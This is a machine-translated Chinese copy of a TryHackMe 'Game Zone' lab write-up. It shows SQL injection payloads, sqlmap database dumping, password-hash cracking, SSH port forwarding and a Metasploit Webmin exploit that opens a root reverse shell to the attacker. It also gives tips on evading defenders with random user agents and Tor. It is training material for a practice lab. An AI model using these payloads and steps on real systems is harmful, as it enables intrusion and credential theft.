<html>
<head>
<title>TryHackMe writeup: Game Zone</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:游戏区</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-game-zone-190da0b68433?source=collection_archive---------0-----------------------#2022-04-04">https://infosecwriteups.com/tryhackme-writeup-game-zone-190da0b68433?source=collection_archive---------0-----------------------#2022-04-04</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="7415" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">游戏区是一个TryHackMe房间，旨在教其用户“如何使用SQLMap，破解一些密码，使用反向SSH隧道显示服务，并将您的权限升级到root”(<a class="ae kp" href="https://tryhackme.com/room/gamezone" rel="noopener ugc nofollow" target="_blank">“TryHackMe”，2019 </a>)。这个房间开始是相当标准的，但后来在特权升级状态下显示出教授有趣的事情。在这篇文章中，我将讨论我的经验，制定出解决这个房间。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj kq"><img src="../Images/fbb3d674299eb94e5f52af3628e87cef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8OJCMStl3PV2Jzbfptsv1A.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">基本形象:<a class="ae kp" href="https://tvtropes.org/pmwiki/pmwiki.php/Main/SmallGirlBigGun" rel="noopener ugc nofollow" target="_blank">电视比喻(未注明)。</a></figcaption></figure><h1 id="66c5" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">程序</h1><p id="86b7" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">在继续之前，确定本会议室的目标很重要。这是一个演练室，所以它是为了让参赛者按照提示学习新技能而建造的。然而，主要目标是获得用户标志和根标志。</p><h2 id="2b3c" class="mj lh iu bd li mk ml dn lm mm mn dp lq kc mo mp lu kg mq mr ly kk ms mt mc mu bi translated">初始探测</h2><p id="61b3" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">与这些TryHackMe boot2root机器一样，我单击了第一个任务右上角的绿色“start machine”按钮来启动目标虚拟机。大约五分钟后，我开始探测系统。目标机器正在运行一个web服务器，上面有一个横幅，描绘了一个手持狙击手的卡通小子(图1):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj mv"><img src="../Images/0fbf6a533b515ca40bb9626f6486f4fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CdUD7kcLAOHV21BcjKtTkg.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图1:目标机器的网站。</strong></figcaption></figure><p id="94c5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">通过谷歌的反向图像搜索功能，并通过分析结果了解其来源媒体，可以发现那个挥舞着狙击手的家伙的名字。</p><h2 id="639e" class="mj lh iu bd li mk ml dn lm mm mn dp lq kc mo mp lu kg mq mr ly kk ms mt mc mu bi translated">剥削</h2><p id="3366" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">为了获得对机器的初始访问权，我将利用web应用系统中的SQL注入漏洞从系统中提取信息。我将运行Burp Suite的社区版(<a class="ae kp" href="https://portswigger.net/burp/communitydownload" rel="noopener ugc nofollow" target="_blank"> PortSwigger，n.d. </a>)，如图2所示:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj mw"><img src="../Images/375ef7476d5933cf017c66a89ae56a19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cpWFojBAEYDwkVvgRarmWQ.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图2:打嗝套件面板。</strong></figcaption></figure><p id="0de5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我打开浏览器(图2a)并关闭拦截功能(图2b)。然后，我通过将字符串<code class="fe mx my mz na b">' or 1=1-- -</code>插入“log in”字段(图1a)和将一个随机字符串插入“password”字段(图1b)来“开始工作”。这样，我用必要的凭证登录，并将自己重定向到<code class="fe mx my mz na b">/portal.php</code>网页(图3):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj nb"><img src="../Images/7b224ed4c0c00c8fee7779ec980efeb8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1308/format:webp/1*gPtx3t-rSH2jX0Tpq5w0Ww.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图3:</strong><code class="fe mx my mz na b">/portal.php</code><strong class="bd li">重定向页面。</strong></figcaption></figure><p id="1508" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">文本框(图3a)很可能易受SQL注入攻击。为了测试这个假设，我将在其中插入一个随机字符串(在我的例子中是<code class="fe mx my mz na b">dna deniers</code>),然后单击“search”按钮(图3b)。尽管“拦截”按钮被设置为关闭，Burp Suite仍会拦截其内置的Google Chrome浏览器发出的这些请求(图2b)。可以通过代理的HTTP历史窗格(图2c)访问这些请求，然后将POST请求转发到中继器(图4):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nc"><img src="../Images/967fb5c8d03046702014ea8387889faa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tDC9zHYFdFyjCuLtuqWitg.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图4:带有潜在SQL注入向量的POST请求。</strong></figcaption></figure><p id="08a5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将原始(图4b)请求的文本字段(图4a)的内容保存到一个文本文档中。该请求可以传递给一个名为<a class="ae kp" href="https://sqlmap.org/" rel="noopener ugc nofollow" target="_blank"> sqlmap (n.d.) </a>的工具，该工具可以自动化利用SQL注入漏洞向量的过程。为此，我在我的攻击箱上启动了一个终端，将目录更改为我的游戏区项目文件，并使用以下参数启动<code class="fe mx my mz na b">sqlmap</code>:</p><pre class="kr ks kt ku gu nd na ne nf aw ng bi"><span id="dd29" class="mj lh iu na b gz nh ni l nj nk"><strong class="na iv">└─$ sqlmap --random-agent -r requests.txt --dbms=mysql --dump</strong></span></pre><p id="e869" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mx my mz na b">-r</code>标志指定我刚才保存请求文本文件，<code class="fe mx my mz na b">--dbms</code>标志指定目标系统正在运行的数据库管理系统(在本例中是MySQL),<code class="fe mx my mz na b">--dump</code>标志指示<code class="fe mx my mz na b">sqlmap</code>转储整个数据库。</p><p id="84ed" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">最后，<code class="fe mx my mz na b">--random-agent</code>标志指示<code class="fe mx my mz na b">sqlmap</code>使用随机的浏览器用户代理字符串，这可能会迷惑任何正在寻找黑客的系统管理员或安全分析师。<strong class="jt iv"> Protip: </strong>在<strong class="jt iv"> </strong>真实世界red组队约定中，<code class="fe mx my mz na b">--tor</code>标志可用于通过Tor匿名软件(<a class="ae kp" href="https://www.torproject.org/" rel="noopener ugc nofollow" target="_blank"> Tor Project，n.d. </a>)隧道<code class="fe mx my mz na b">sqlmap</code>请求和网络流量，这可进一步迷惑任何系统管理员或安全分析师。</p><p id="efc0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mx my mz na b">sqlmap</code>报告了以下关于已确定的SQL注入种类的信息:</p><pre class="kr ks kt ku gu nd na ne nf aw ng bi"><span id="6c5f" class="mj lh iu na b gz nh ni l nj nk">sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:<br/>---<br/>Parameter: searchitem (POST)<br/>  Type: boolean-based blind<br/>    Title: OR boolean-based blind — WHERE or HAVING clause (MySQL comment)<br/>    Payload: searchitem=-2335' OR 7043=7043#</span><span id="5c29" class="mj lh iu na b gz nl ni l nj nk">  Type: error-based<br/>    Title: MySQL &gt;= 5.6 AND error-based -- WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)<br/>    Payload: searchitem=dna deniers' AND GTID_SUBSET(CONCAT(0x716b627171,(SELECT (ELT(7775=7775,1))),0x71786a7871),7775)-- aOTf</span><span id="9d89" class="mj lh iu na b gz nl ni l nj nk">  Type: time-based blind<br/>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br/>    Payload: searchitem=dna deniers' AND (SELECT 1312 FROM (SELECT(SLEEP(5)))EjBJ)-- fvCO</span><span id="710c" class="mj lh iu na b gz nl ni l nj nk">  Type: UNION query<br/>    Title: MySQL UNION query (NULL) -- 3 columns<br/>    Payload: searchitem=dna deniers’ UNION ALL SELECT NULL,CONCAT(0x716b627171,0x6a41586165704d534f575655686848776e59524f666c767767504672656e4c50695148467942434e,0x71786a7871),NULL#<br/>---</span></pre><p id="856f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">输入文本框易受四种不同的SQL注入攻击:基于联合查询的SQL注入、基于布尔的盲SQL注入、基于错误的SQL注入和基于时间的盲SQL注入。我不会讨论这些注入的技术方面，但对于任何对全面治疗感兴趣的人，我推荐《T21 SQL注入攻击和防御》这本书。</p><p id="c655" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在<code class="fe mx my mz na b">sqlmap</code>完成从目标机器转储MySQL实例之后，我检查了它转储的表。我注意到两张桌子，一张是T1桌，另一张是T2桌。<code class="fe mx my mz na b">post</code>表只包含视频游戏标题和对它们的描述。<code class="fe mx my mz na b">user</code>表(图5)有更多有用的信息:<code class="fe mx my mz na b">username</code>和<code class="fe mx my mz na b">pwd</code>字段——第二个字段是各自用户名的散列密码。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nn"><img src="../Images/7ff2eb717ad7925a986696538817a3e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NqnV745QadtF95Vb8j4SbA.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图5:</strong><code class="fe mx my mz na b">user</code><strong class="bd li">表转储的格式化表。</strong></figcaption></figure><p id="f562" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">注意，在图5所示的表格中只有一行。我已经将完整的散列分成两行，以便该表更容易阅读。用户名是<code class="fe mx my mz na b">agent47</code>，完整的哈希密码是:</p><pre class="kr ks kt ku gu nd na ne nf aw ng bi"><span id="3e3c" class="mj lh iu na b gz nh ni l nj nk">ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14</span></pre><p id="0835" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">有了用户名和散列密码，我现在可以用开膛手约翰(<a class="ae kp" href="https://www.openwall.com/john/" rel="noopener ugc nofollow" target="_blank"> OpenWall，n.d. </a>)破解散列。在我的攻击箱上，我将散列存储在一个文本文件中:</p><pre class="kr ks kt ku gu nd na ne nf aw ng bi"><span id="6cb7" class="mj lh iu na b gz nh ni l nj nk"><strong class="na iv">└─$ touch hash.txt</strong><br/> <br/><strong class="na iv">└─$ echo "ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14" &gt;&gt; hash.txt</strong><br/><br/><strong class="na iv">└─$ cat hash.txt </strong><br/>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14</span></pre><p id="97b0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在我破解哈希之前，我需要知道它是什么类型的哈希。我使用了<a class="ae kp" href="https://hashes.com/en/tools/hash_identifier" rel="noopener ugc nofollow" target="_blank">散列类型标识符(n.d.) </a>来确定这个散列是用SHA-256算法生成的。知道了我正在处理的散列类型，我可以继续指示开膛手约翰破解密码:</p><pre class="kr ks kt ku gu nd na ne nf aw ng bi"><span id="70c9" class="mj lh iu na b gz nh ni l nj nk"><strong class="na iv">└─$ john hash.txt --wordlist=./rockyou.txt --format=Raw-SHA256</strong><br/>[... snip ...]<br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/><strong class="na iv"><em class="nm">videogamer124 (?) </em></strong><br/>1g 0:00:00:00 DONE (redacted) 1.694g/s 4900Kp/s 4900Kc/s 4900KC/s vidhus..vidamexicana<br/>Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably<br/>Session completed.</span></pre><p id="f614" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">有了用户名-密码组合<code class="fe mx my mz na b">agent47:videogamer124</code>，我现在可以测试“agent47”重用登录凭证的概念。我启动了一个到目标机器的SSH连接，并尝试使用前面提到的用户名和密码组合登录系统:</p><pre class="kr ks kt ku gu nd na ne nf aw ng bi"><span id="8774" class="mj lh iu na b gz nh ni l nj nk"><strong class="na iv">└─$ ssh agent47@&lt;boot2root ip&gt;</strong><br/>The authenticity of host '&lt;boot2root ip&gt; (&lt;boot2root ip&gt;)' can't be established.<br/>ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.<br/>This key is not known by any other names<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? <strong class="na iv">[yes]</strong><br/>Warning: Permanently added '&lt;boot2root ip&gt;' (ED25519) to the list of known hosts.<br/>agent47@&lt;boot2root ip&gt;'s password: <strong class="na iv">[videogamer124]</strong><br/>Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0–159-generic x86_64)</span><span id="311a" class="mj lh iu na b gz nl ni l nj nk"> * Documentation: https://help.ubuntu.com<br/> * Management: https://landscape.canonical.com<br/> * Support: https://ubuntu.com/advantage</span><span id="94fa" class="mj lh iu na b gz nl ni l nj nk">109 packages can be updated.<br/>68 updates are security updates.</span><span id="9773" class="mj lh iu na b gz nl ni l nj nk">Last login: [redacted] from [redacted]<br/><strong class="na iv">agent47@gamezone:~$</strong></span></pre><p id="cc7d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我现在有了与系统交互的方法——至少是与授予<code class="fe mx my mz na b">agent47</code>的权限交互。</p><h2 id="5c76" class="mj lh iu bd li mk ml dn lm mm mn dp lq kc mo mp lu kg mq mr ly kk ms mt mc mu bi translated">后期开发</h2><p id="8928" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">我将从转储用户标志开始:</p><pre class="kr ks kt ku gu nd na ne nf aw ng bi"><span id="cae0" class="mj lh iu na b gz nh ni l nj nk"><strong class="na iv">agent47@gamezone:~$ ls</strong><br/>user.txt<br/><strong class="na iv">agent47@gamezone:~$ cat user.txt<br/></strong>[redacted]</span></pre><p id="a3f1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这是一个好的开始。但是，系统上还有一个根标志。为了获得根标志，实验室建议使用反向SSH隧道(<a class="ae kp" href="https://goteleport.com/blog/ssh-tunneling-explained/" rel="noopener ugc nofollow" target="_blank"> Shah，2021 </a>)将攻击箱上的本地端口转发到目标机器上运行的本地服务，该目标机器被配置为在本地回环上运行或位于某个防火墙之后。</p><p id="8d41" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">首先，我将在目标系统上使用<code class="fe mx my mz na b">ss</code>实用程序来枚举自身上正在运行的服务:</p><pre class="kr ks kt ku gu nd na ne nf aw ng bi"><span id="d90b" class="mj lh iu na b gz nh ni l nj nk"><strong class="na iv">agent47@gamezone:~$ ss -t -u -l -p -n</strong><br/>Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port <br/>udp   UNCONN 0      0      *:10000            *:* <br/>udp   UNCONN 0      0      *:68               *:* <br/>tcp   LISTEN 0      80     127.0.0.1:3306     *:* <br/>tcp   LISTEN 0      128    *:10000            *:* <br/>tcp   LISTEN 0      128    *:22               *:* <br/>tcp   LISTEN 0      128    :::80              :::* <br/>tcp   LISTEN 0      128    :::22              :::*</span></pre><p id="702f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mx my mz na b">-t</code>标志显示所有TCP套接字，<code class="fe mx my mz na b">-u</code>标志对UDP套接字做同样的事情，<code class="fe mx my mz na b">-l</code>标志列出监听套接字，<code class="fe mx my mz na b">-p</code>标志列出使用套接字的进程，<code class="fe mx my mz na b">-n</code>标志确保服务名称不被解析。</p><p id="1d29" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">端口10000通常与基于web的系统管理工具相关联。因此，我现在将配置我的攻击箱以建立一个SSH隧道，该隧道将侦听本地端口4444，并将流量从它重定向到目标机器上的10000端口:</p><pre class="kr ks kt ku gu nd na ne nf aw ng bi"><span id="ae4f" class="mj lh iu na b gz nh ni l nj nk"><strong class="na iv">└─$ ssh -N -L 4444:127.0.0.1:10000 agent47@&lt;boot2root ip&gt;</strong><br/>agent47@&lt;boot2root ip&gt;'s password: <strong class="na iv">[videogamer124]<br/></strong>[... listening ...]</span></pre><p id="a8fb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mx my mz na b">-L</code>标志告诉<code class="fe mx my mz na b">ssh</code>实用程序建立一个ssh反向隧道，在端口4444上监听，并将流量重定向到目标机器的端口10000，<code class="fe mx my mz na b">-N</code>标志告诉SSH实用程序不要执行任何命令。</p><p id="1bfb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">随着SSH反向隧道的建立，我现在可以通过我的web浏览器上的<code class="fe mx my mz na b">127.0.0.1:4444</code>来访问假设的web管理工具。我看到了<a class="ae kp" href="https://www.webmin.com/" rel="noopener ugc nofollow" target="_blank"> Webmin(未标明)</a>面板(图6):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj no"><img src="../Images/cde516ed3f9ab66cc690fdd10b856d7a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1208/format:webp/1*ukbEGdu6ltCpsR5rTAMqxw.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图Webmin面板。</strong></figcaption></figure><p id="4bda" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将使用<code class="fe mx my mz na b">agent47:videogamer124</code>用户名和密码组合登录，然后…</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj np"><img src="../Images/9c4d159f0d87a88dc9ccc8d5d581478b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vqdKEwDXJptehNd_Vmka5Q.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图7:登录Webmin面板后。</strong></figcaption></figure><p id="3c38" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">该版本的Webmin为<code class="fe mx my mz na b">1.580</code>(图7a)，易受远程命令执行攻击，可用于权限提升目的。我将在攻击箱上配置漏洞:</p><pre class="kr ks kt ku gu nd na ne nf aw ng bi"><span id="7f17" class="mj lh iu na b gz nh ni l nj nk"><strong class="na iv">└─$ sudo msfconsole </strong></span><span id="5352" class="mj lh iu na b gz nl ni l nj nk">[... snip ...]</span><span id="a49c" class="mj lh iu na b gz nl ni l nj nk"><strong class="na iv">msf6 &gt; use exploit/unix/webapp/webmin_show_cgi_exec</strong><br/><strong class="na iv">msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set PAYLOAD payload/cmd/unix/reverse</strong><br/>PAYLOAD =&gt; cmd/unix/reverse<br/><strong class="na iv">msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set USERNAME agent47</strong><br/>USERNAME =&gt; agent47<br/><strong class="na iv">msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set PASSWORD videogamer124</strong><br/>PASSWORD =&gt; videogamer124<br/><strong class="na iv">msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set RHOSTS 127.0.0.1</strong><br/>RHOSTS =&gt; 127.0.0.1<br/><strong class="na iv">msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set RPORT 4444<br/>RPORT =&gt; 4444</strong></span><span id="2482" class="mj lh iu na b gz nl ni l nj nk">[... snip ...]</span><span id="04c8" class="mj lh iu na b gz nl ni l nj nk"><strong class="na iv">msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set LHOST &lt;attackbox ip&gt;</strong><br/>LHOST =&gt; &lt;attackbox ip&gt;<br/><strong class="na iv">msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set LPORT 4446</strong><br/>LPORT =&gt; 4446<br/><strong class="na iv">msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set SSL false</strong><br/>[!] Changing the SSL option’s value may require changing RPORT!<br/>SSL =&gt; false<br/><strong class="na iv">msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; exploit</strong></span><span id="6431" class="mj lh iu na b gz nl ni l nj nk">[*] Started reverse TCP double handler on &lt;attackbox ip&gt;:4446 <br/>[*] Attempting to login…<br/>[+] Authentication successful<br/>[+] Authentication successful<br/>[*] Attempting to execute the payload…<br/>[*] Accepted the first client connection…<br/>[*] Accepted the second client connection…<br/>[+] Payload executed successfully<br/>[*] Command: echo za1W8NUh1pucbcDG;<br/>[*] Writing to socket A<br/>[*] Writing to socket B<br/>[*] Reading from sockets…<br/>[*] Reading from socket A<br/>[*] A: "za1W8NUh1pucbcDG\r\n"<br/>[*] Matching...<br/>[*] B is input...<br/>[*] Command shell session 1 opened (&lt;attackbox ip&gt;:4446 -&gt; &lt;boot2root ip&gt;:34436 ) at [redacted] -0400</span><span id="7a6b" class="mj lh iu na b gz nl ni l nj nk"><strong class="na iv">id</strong><br/>uid=0(root) gid=0(root) groups=0(root)<br/><strong class="na iv">cat /root/root.txt<br/></strong>[redacted]</span></pre><p id="0b24" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h1 id="2b84" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">结论</h1><p id="8d78" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">这是一个讨论面向公众的web应用程序的标准漏洞的房间。在我看来，最有趣的部分是打开一个到目标系统的反向隧道来访问本地<a class="ae kp" href="https://www.webmin.com/" rel="noopener ugc nofollow" target="_blank"> Webmin (n.d.) </a>面板，以达到权限提升的目的。</p><h2 id="4459" class="mj lh iu bd li mk ml dn lm mm mn dp lq kc mo mp lu kg mq mr ly kk ms mt mc mu bi translated">外卖食品</h2><ul class=""><li id="cbe9" class="nq nr iu jt b ju me jy mf kc ns kg nt kk nu ko nv nw nx ny bi translated">正如在这个和其他TryHackMe房间所展示的那样，反向谷歌图片搜索配合敏锐的眼睛可以揭示关于图片的背景细节。</li><li id="6b29" class="nq nr iu jt b ju nz jy oa kc ob kg oc kk od ko nv nw nx ny bi translated">密码破解可能有点蹩脚，但不应该被忽视，因为它可能导致凭据填充。</li><li id="5227" class="nq nr iu jt b ju nz jy oa kc ob kg oc kk od ko nv nw nx ny bi translated">可以创建反向SSH隧道来访问目标系统上的本地服务，如下所示:</li></ul><pre class="kr ks kt ku gu nd na ne nf aw ng bi"><span id="3214" class="mj lh iu na b gz nh ni l nj nk"><strong class="na iv">$ ssh -N -L [attacker port]:127.0.0.1:[target port] &lt;user@target ip&gt;</strong></span></pre><h2 id="b550" class="mj lh iu bd li mk ml dn lm mm mn dp lq kc mo mp lu kg mq mr ly kk ms mt mc mu bi translated">插头</h2><p id="052e" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">看看我的朋友米拉·拉辛，她和其他同事一样，需要经济和情感上的帮助。请查看以下链接:</p><ul class=""><li id="ef0c" class="nq nr iu jt b ju jv jy jz kc oe kg of kk og ko nv nw nx ny bi translated">她的推特简介:<a class="ae kp" href="https://twitter.com/MiraLazine" rel="noopener ugc nofollow" target="_blank">https://twitter.com/MiraLazine</a></li><li id="4396" class="nq nr iu jt b ju nz jy oa kc ob kg oc kk od ko nv nw nx ny bi translated">她的中等身材:<a class="ae kp" href="https://medium.com/@MiraLazine" rel="noopener">https://medium.com/@MiraLazine</a></li><li id="7665" class="nq nr iu jt b ju nz jy oa kc ob kg oc kk od ko nv nw nx ny bi translated">用现金捐给她自己。app:【https://cash.app/$MiraLazine T2】</li></ul><h1 id="3ca8" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">参考</h1><p id="a9bb" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">j .克拉克(2012年)。<em class="nm"> SQL注入攻击与防御【第二版】</em>。Syngress。</p><p id="bebb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">哈希类型标识符(未标明)。2022年4月1日检索自:<a class="ae kp" href="https://hashes.com/en/tools/hash_identifier" rel="noopener ugc nofollow" target="_blank">https://hashes.com/en/tools/hash_identifier</a></p><p id="0b21" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">开放式墙壁(未标明)。<em class="nm">开膛手约翰密码破解</em>。2022年4月1日检索自:<a class="ae kp" href="https://www.openwall.com/john/" rel="noopener ugc nofollow" target="_blank">https://www.openwall.com/john/</a></p><p id="1996" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">波特斯威格(未标明)。<em class="nm">打嗝套件社区版</em>。2022年4月2日检索自:<a class="ae kp" href="https://portswigger.net/burp/communitydownload" rel="noopener ugc nofollow" target="_blank">https://portswigger.net/burp/communitydownload</a></p><p id="c545" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">沙阿，S. (2021)。<em class="nm"> SSH隧道讲解</em>。心灵传输博客。2022年4月1日检索自:<a class="ae kp" href="https://goteleport.com/blog/ssh-tunneling-explained/" rel="noopener ugc nofollow" target="_blank">https://goteleport.com/blog/ssh-tunneling-explained/</a></p><p id="a838" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">sqlmap(未标明)。<em class="nm">自动SQL注入和数据库接管工具</em>。2022年4月1日检索自:<a class="ae kp" href="https://sqlmap.org/" rel="noopener ugc nofollow" target="_blank">https://sqlmap.org/</a></p><p id="e9c2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Tor项目(未注明日期)。2022年4月2日检索自:<a class="ae kp" href="https://www.torproject.org/" rel="noopener ugc nofollow" target="_blank">https://www.torproject.org/</a></p><p id="7041" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《tryhackme》(2019)。<em class="nm">游戏区</em>。2022年4月2日检索自:<a class="ae kp" href="https://tryhackme.com/room/gamezone" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/gamezone</a></p><p id="0e73" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">电视比喻(未注明)。<em class="nm">小女孩，大枪</em>。2022年4月2日检索自:<a 